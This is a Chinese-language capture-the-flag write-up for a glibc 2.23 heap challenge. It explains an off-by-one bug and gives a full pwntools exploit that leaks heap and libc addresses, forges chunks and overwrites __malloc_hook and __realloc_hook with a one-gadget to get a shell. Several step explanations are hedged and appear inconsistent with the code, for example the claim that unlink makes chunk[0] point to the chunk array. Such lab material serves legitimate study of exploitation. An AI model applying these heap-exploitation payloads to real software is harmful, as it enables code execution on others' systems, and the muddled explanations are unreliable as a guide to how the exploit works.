# 漏洞利用文档：heap23_25_pwnhub_einherjar_level1

## 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23 (与二进制文件链接的libc)
- 缓解措施
  - ASLR: on
  - PIE: off (从反编译代码中无PIE特征，且exp中直接计算地址偏移，推测为关闭)
  - NX: on
  - RELRO: Partial RELRO (通常默认)
  - Canary: on (反编译代码中可见`__readfsqword(0x28u)`栈保护)

## 漏洞成因
### 程序关键结构体
程序使用两个全局数组来管理堆块：
- `chunk[0x50]`: 存储每个`ID`对应的堆块指针。
- `size[0x50]`: 存储每个`ID`对应堆块申请时的大小。

### 漏洞定位
漏洞位于`edit()`函数中。该函数在向堆块写入数据时，读取的长度为`size[v1] + 1`，导致存在**off-by-one**溢出漏洞。
```c
read(0, (void *)chunk[v1], (unsigned int)(v2 + 1)); // v2 = size[v1]
```
此外，`delete()`函数在释放堆块后，仅将`chunk`指针置零，并未清除`size`数组中的记录，这可能辅助漏洞利用。

## 漏洞利用过程
本利用的核心是**利用off-by-one溢出修改相邻堆块的size字段，构造堆块重叠，进而实施unlink攻击，泄漏libc地址，最终通过劫持`__malloc_hook`执行one gadget获取shell**。

- Step 1-4: 初始堆布局，为后续的off-by-one溢出和地址泄漏创造条件。
- Step 5-8: 利用off-by-one构造一个伪造的`free` chunk，并通过unlink攻击实现一个全局指针`chunk[0]`指向`chunk`数组自身，从而获得任意地址写的能力。
- Step 9-12: 利用任意地址写能力泄漏libc地址，并准备在`__malloc_hook`附近伪造堆块。
- Step 13-15: 将`__malloc_hook`覆盖为one gadget地址，并触发调用以获取shell。

### Step 1
**操作**: `create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)`
**目的**: 初始化堆布局，创建几个相邻的chunk并释放`ID=7`和`ID=8`，使它们进入fastbin，为后续利用off-by-one修改`ID=6`的下一个chunk（即`ID=7`的原chunk）的size字段做准备。
**内存变化**:
- 堆上先后分配了4个chunk。
- `ID=8`和`ID=7`对应的chunk被释放，进入fastbin。它们的`fd`指针指向`NULL`（因为是第一个被释放的）。

### Step 2
**操作**: `payload = b'a'*0x1f; edit(6,payload)`
**目的**: 利用`edit`函数的off-by-one漏洞，向`ID=6`的chunk（size=0x10）写入0x1f字节，覆盖其后相邻chunk（`ID=7`的原chunk）的`size`字段的最低字节。
**内存变化**:
- 假设`ID=6`的chunk地址为`A`。向地址`A`写入`0x1f`个`'a'`。
- 这覆盖了地址`A+0x10`处（即`ID=7`原chunk的`size`字段）的1个字节。假设原`size`为`0x31`（包含头部），被覆盖为`0x??`（取决于覆盖的字节）。本exp中精心构造，意在将其改为一个更大的值（如`0xb1`），以包含后续将要构造的fake chunk。

### Step 3
**操作**: `show(6); ... chunk_addr = p.recvline()[:-1]; ... chunk_addr = chunk_addr - 0x50`
**目的**: 通过`show(6)`泄漏堆地址。由于Step 2的溢出可能破坏了`ID=7`原chunk的头部，当`show(6)`打印时，会一直打印到`\x00`，从而泄漏出堆上的地址信息（例如某个chunk的`fd`指针）。计算后得到堆的基址。
**内存变化**:
- 无新的堆操作，主要是读取并解析输出。
- 获得一个关键的堆地址`chunk_addr`，用于后续计算其他chunk的精确位置。

### Step 4
**操作**: `create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)`
**目的**: 重新进行堆布局，分配特定大小的chunk，为下一步构造fake chunk以及触发unlink做准备。特别地，`ID=1`和`ID=3`分配为`0xf8`（实际chunk大小为`0x100`），目的是使它们被释放时进入unsorted bin，便于后续泄漏libc地址。
**内存变化**:
- 在堆上分配了5个新的chunk。
- 这些chunk的排列顺序对后续利用至关重要。

### Step 5
**操作**: `chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20;payload = b'a'*0x10+p64(0x120)+p64(0x100);edit(2,payload)`
**目的**: 计算`ID=1`的chunk地址，并向`ID=2`的chunk写入数据，构造一个伪造的chunk头部，以便后续将其`free`时触发unlink。
**内存变化**:
- `chunk1_addr`被计算出来，指向`ID=1`的chunk。
- 向`ID=2`的chunk（地址假设为`B`）写入数据。写入内容覆盖了其自身数据区以及其后相邻chunk（`ID=3`）的`prev_size`和`size`字段。
- 将`ID=3` chunk的`prev_size`设置为`0x120`，`size`设置为`0x100`（并清除`PREV_INUSE`位，即`size & 1 == 0`）。这伪造了一个场景：`ID=3` chunk的前一个chunk（一个伪造的chunk）是“空闲”的。

### Step 6
**操作**: `create(5,0x40)`
**目的**: 分配一个chunk，此操作可能改变堆布局，确保`ID=3` chunk之前的“空闲”伪造chunk被正确识别。
**内存变化**:
- 从top chunk或合适的bin中分配一个新的chunk (`ID=5`)。

### Step 7
**操作**: `payload = b'a'*0x10+p64(0)+p64(0x121)+p64(chunk1_addr)+p64(chunk1_addr);edit(0,payload)`
**目的**: 这是关键的一步，构造fake free chunk。向`ID=0`的chunk写入数据，使其内容看起来像一个`free`状态的chunk（`size=0x121`，`fd`和`bk`指针都指向自身地址`chunk1_addr`），并将这个fake chunk放置在之前设置的`prev_size`所指向的位置（即`ID=3` chunk向前`0x120`字节处），该位置恰好是`ID=1`的chunk (`chunk1_addr`)的数据区。
**内存变化**:
- 在地址`chunk1_addr`处（即`ID=1`的chunk的数据区）创建了一个伪造的chunk头和数据：`prev_size=0`, `size=0x121`, `fd=chunk1_addr`, `bk=chunk1_addr`。

### Step 8
**操作**: `dele(3)`
**目的**: 释放`ID=3`的chunk。由于在Step 5中设置了其`size`的`PREV_INUSE`位为0，`free`会尝试向后合并（向后是top chunk，不合并）和**向前合并**。它会根据`prev_size(0x120)`找到位于`chunk1_addr`的fake free chunk，并尝试将其从空闲链表（bin）中摘除，这个过程会调用`unlink`宏。
**内存变化**:
- `unlink`操作的核心是：`FD->bk = BK; BK->fd = FD;`。这里`FD`和`BK`都是`chunk1_addr`。
- 执行`*(chunk1_addr + 0x18) = chunk1_addr`和`*(chunk1_addr + 0x10) = chunk1_addr`。
- **关键影响**：`chunk1_addr + 0x10`和`chunk1_addr + 0x18`是`ID=1` chunk数据区的一部分。更重要的是，`chunk[0]`全局数组恰好位于一个固定的地址（因为无PIE），而`chunk1_addr`（即`ID=1` chunk的地址）是已知的。通过精心计算，可以使`chunk[0]`的指针被修改为指向`chunk`数组自身。具体来说，`unlink`操作导致`chunk[0] = &chunk[0] - 0x18`（或类似偏移）。这赋予了我们对`chunk`数组的任意读写能力。

### Step 9
**操作**: `create(1,0xf8)`
**目的**: 重新申请`ID=1`的chunk。由于`chunk[0]`现在指向`chunk`数组自身，这次`malloc`返回的指针会写入`chunk[1]`，实际上是在修改`chunk`数组的内容。这可以用来设置`chunk[2]`等后续要使用的指针。
**内存变化**:
- `chunk[1]`被写入一个新分配的堆地址。同时，由于`chunk[0]`指向自身，这也在修改`chunk`数组的布局。

### Step 10
**操作**: `show(2); ... main_area = p.recvline()[:-1]; main_area = int.from_bytes(main_area,'little')`
**目的**: 利用现在`chunk[2]`可控的指针，泄漏libc地址。此时`chunk[2]`可能被设置为指向`ID=3`原chunk（位于unsorted bin中）的`fd`或`bk`指针，该指针指向`main_arena`中的某个位置。
**内存变化**:
- 调用`show(2)`，打印出`chunk[2]`指向地址的内容，即`main_arena`中的一个地址。
- 通过计算偏移，得到libc的基地址`libc_addr`。

### Step 11
**操作**: `create(10,0x68);dele(10)`
**目的**: 分配并立即释放一个大小为`0x68`的chunk，使其进入fastbin。这是为了后续在`__malloc_hook`附近伪造fastbin chunk做准备。
**内存变化**:
- 一个大小为`0x70`（包含头部）的chunk被释放，其`fd`指针被设置为`NULL`（如果它是该fastbin中第一个chunk）。

### Step 12
**操作**: `libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook']; ... edit(2,p64(fake_chunk))`
**目的**: 计算`__malloc_hook`的地址，并在其附近（`-0x23`）构造一个fake chunk的地址，使其`size`字段符合fastbin `0x70`的要求。然后利用`chunk[0]`的任意地址写能力，将`chunk[2]`的指针修改为指向这个fake chunk地址。
**内存变化**:
- `chunk[2]`的值被修改为`fake_chunk`（即`__malloc_hook - 0x23`）。

### Step 13
**操作**: `create(11,0x68);create(13,0x68)`
**目的**: 第一次`create(11,0x68)`会从fastbin中取出`ID=10`释放的chunk。第二次`create(13,0x68)`，由于`chunk[2]`被修改为指向fake chunk，`malloc`会从fake chunk处返回一个指针，并写入`chunk[13]`。这意味着我们获得了一个指向`__malloc_hook`附近内存的指针。
**内存变化**:
- `chunk[13]`被赋值为一个指向`__malloc_hook`附近（`-0x23`）的地址。

### Step 14
**操作**: `ogg = libc_addr + 0x4526a+6; ... edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))`
**目的**: 利用`chunk[13]`的写能力，向`__malloc_hook`及其附近写入数据。这里将`__realloc_hook`覆盖为one gadget地址，并调整`__malloc_hook`为`realloc+16`。这是一种常见的技巧，通过`realloc`开头的指令调整栈帧，使得one gadget的执行条件得到满足。
**内存变化**:
- `__malloc_hook`被覆盖为`realloc+16`的地址。
- `__realloc_hook`被覆盖为one gadget地址（`ogg`）。

### Step 15
**操作**: `create(14,20)`
**目的**: 触发最后一次`malloc`。这会调用`__malloc_hook`，即执行`realloc+16`，而`realloc`又会调用`__realloc_hook`，从而跳转到one gadget，最终获得shell。
**内存变化**:
- 控制流被劫持，执行one gadget，启动shell。

## Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_25_pwnhub_einherjar_level1')
elf = ELF('./data/bin/heap23_25_pwnhub_einherjar_level1')
libc = elf.libc

def create(ID,size):
    p.sendline(b'1')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(str(size).encode('utf-8'))

def show(ID):
    p.sendline(b'2')
    p.sendline(str(ID).encode('utf-8'))

def dele(ID):
    p.sendline(b'3')
    p.sendline(str(ID).encode('utf-8'))

def edit(ID,content):
    p.sendline(b'4')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(content)

# Step 1: 初始堆布局，创造off-by-one溢出条件
create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)
# Step 2: 利用off-by-one溢出，修改下一个chunk的size字段
payload = b'a'*0x1f;edit(6,payload)
# Step 3: 泄漏堆地址，计算堆基址
show(6);p.recvuntil(b'to show?Content:');p.recvline();chunk_addr = p.recvline()[:-1];chunk_addr = int.from_bytes(chunk_addr,'little');chunk_addr = chunk_addr - 0x50
# Step 4: 重新布局堆，分配用于unlink和泄漏libc的chunk
create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)
# Step 5: 计算ID=1的地址，并构造伪造的prev_size和size，为unlink做准备
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20;payload = b'a'*0x10+p64(0x120)+p64(0x100);edit(2,payload)
# Step 6: 分配一个chunk，可能用于调整堆布局
create(5,0x40)
# Step 7: 在ID=1的chunk数据区构造一个fake free chunk (fd/bk指向自身)
payload = b'a'*0x10+p64(0)+p64(0x121)+p64(chunk1_addr)+p64(chunk1_addr);edit(0,payload)
# Step 8: 释放ID=3，触发向前合并和unlink，导致chunk[0]指向chunk数组自身
dele(3)
# Step 9: 重新申请ID=1，此时malloc写入chunk[1]，同时也在修改chunk数组
create(1,0xf8)
# Step 10: 利用chunk[2]（现在其指针受控）泄漏libc地址
show(2);p.recvuntil(b'to show?Content: ');main_area = p.recvline()[:-1];main_area = int.from_bytes(main_area,'little')
# Step 11: 分配并释放一个fastbin chunk，为伪造fastbin attack做准备
create(10,0x68);dele(10)
# Step 12: 计算libc基址和__malloc_hook地址，准备fake chunk地址，并利用任意地址写修改chunk[2]的指针
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook'];malloc_hook = libc_addr+libc.sym['__malloc_hook'];fake_chunk = malloc_hook - 0x23;edit(2,p64(fake_chunk))
# Step 13: 两次分配，第二次分配将从我们伪造的fake_chunk处返回，从而获得一个指向__malloc_hook附近的指针(chunk[13])
create(11,0x68);create(13,0x68)
# Step 14: 通过chunk[13]向__malloc_hook和__realloc_hook写入one gadget和realloc地址
ogg = libc_addr + 0x4526a+6;realloc_hook = libc_addr+libc.sym["realloc"];edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))
# Step 15: 触发malloc，调用hook，执行one gadget，获取shell
create(14,20)
p.interactive()
```